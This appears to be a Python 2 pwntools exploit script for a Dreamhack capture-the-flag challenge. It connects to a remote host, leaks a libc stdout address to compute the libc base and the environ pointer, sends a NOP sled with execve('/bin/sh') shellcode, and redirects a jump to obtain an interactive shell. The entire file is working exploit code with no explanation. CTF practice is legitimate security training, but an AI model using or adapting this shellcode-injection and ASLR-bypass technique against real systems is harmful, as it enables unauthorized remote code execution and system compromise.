from pwn import *
e = ELF("./libc.so.6")
context.log_level = 'debug'
context.arch = 'x86_64'
stdout_offset = e.symbols['_IO_2_1_stdout_']
environ_offset = e.symbols['environ']
nop_num = 0x200
shellcode = asm(shellcraft.execve("/bin/sh"))
p = remote("host1.dreamhack.games", 20251)
p.recvuntil("stdout: ")
stdout_addr = int(p.recv(14)[2:14], 16)
print hex(stdout_addr)
libc_base = stdout_addr - stdout_offset
environ_addr = libc_base + environ_offset
print hex(libc_base)
print hex(environ_offset)
print hex(environ_addr)

p.recvuntil("Size: ")
p.sendline('1280')
p.recvuntil('Data: ')
p.sendline('\x90' * nop_num + shellcode)
p.recvuntil("*jmp=")
p.sendline(str(environ_addr))
p.interactive()
